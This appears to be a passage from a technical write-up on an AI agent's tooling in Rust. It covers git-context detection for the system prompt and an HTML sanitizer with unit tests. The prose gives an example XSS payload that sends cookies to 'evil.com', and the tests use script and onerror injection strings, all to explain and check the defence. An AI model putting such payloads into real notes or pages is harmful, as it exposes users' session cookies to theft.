```rust
pub fn build_git_context(project_path: &Path) -> Option<String> {
    // Walk up to find .git directory
    let mut dir = project_path.to_path_buf();
    let git_root = loop {
        if dir.join(".git").exists() { break dir; }
        if !dir.pop() { return None; }
    };

    // Read HEAD directly for branch name (no git dependency)
    let head_path = git_root.join(".git").join("HEAD");
    let head_content = std::fs::read_to_string(&head_path).ok()?;
    let branch = if let Some(ref_line) = head_content.strip_prefix("ref: refs/heads/") {
        ref_line.trim().to_string()
    } else {
        // Detached HEAD - use short hash
        head_content.trim().chars().take(8).collect()
    };

    // Get dirty status via git diff (requires git binary)
    let is_dirty = std::process::Command::new("git")
        .args(["diff", "--quiet", "HEAD"])
        .current_dir(&git_root)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .ok()
        .map(|s| !s.success())
        .unwrap_or(false);

    let diff_stats = if is_dirty {
        let output = std::process::Command::new("git")
            .args(["diff", "HEAD", "--shortstat"])
            .current_dir(&git_root)
            .output().ok()?;
        let stats = String::from_utf8_lossy(&output.stdout).trim().to_string();
        if stats.is_empty() { "dirty (untracked changes)".to_string() }
        else { stats }
    } else {
        "clean".to_string()
    };

    Some(format!("Git: branch={branch}, status={diff_stats}, root={}", git_root.display()))
}
```

Branch detection reads `.git/HEAD` directly (no subprocess). This is fast and works even if git isn't installed. Dirty status uses the git binary because parsing the index format is complex and fragile.

The result gets injected under `# Environment` in the system prompt, giving the model awareness of the current branch and whether there are uncommitted changes. This is critical for git-related tool calls - the model should know it's on `feature/auth` before running `git commit`.

When a notes application (like Apple Notes) uses HTML for rich text storage, injecting raw HTML through the content field is an XSS vector. The attack scenario: the model creates a note with content `<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>`. If the notes app renders this as HTML, the script executes.

```rust
/// Escape HTML special characters to prevent XSS in note content.
pub fn escape_html(input: &str) -> String {
    input
        .replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#x27;")
}

/// Sanitize note content: escape HTML, strip control chars, truncate.
pub fn sanitize_note_content(content: &str) -> String {
    let escaped = escape_html(content);
    // Convert newlines to <br> for proper rendering
    let with_breaks = escaped.replace('\n', "<br>");
    // Strip null bytes
    let clean = with_breaks.replace('\0', "");
    // Truncate extremely long content
    if clean.len() > 100_000 {
        format!("{}... [content truncated]", &clean[..100_000])
    } else {
        clean
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_script_tag_escaped() {
        let input = "<script>alert(document.cookie)</script>";
        let sanitized = sanitize_note_content(input);
        assert!(!sanitized.contains("<script>"));
        assert!(sanitized.contains("&lt;script&gt;"));
    }

    #[test]
    fn test_img_onerror_escaped() {
        let input = "<img src=x onerror=alert(1)>";
        let sanitized = sanitize_note_content(input);
        assert!(!sanitized.contains("<img"));
    }

    #[test]
    fn test_normal_text_preserved() {
        let input = "Meeting notes: discussed Q4 goals & budget";
        let sanitized = sanitize_note_content(input);
        assert!(sanitized.contains("Meeting notes"));
        assert!(sanitized.contains("&amp;")); // & is escaped
    }

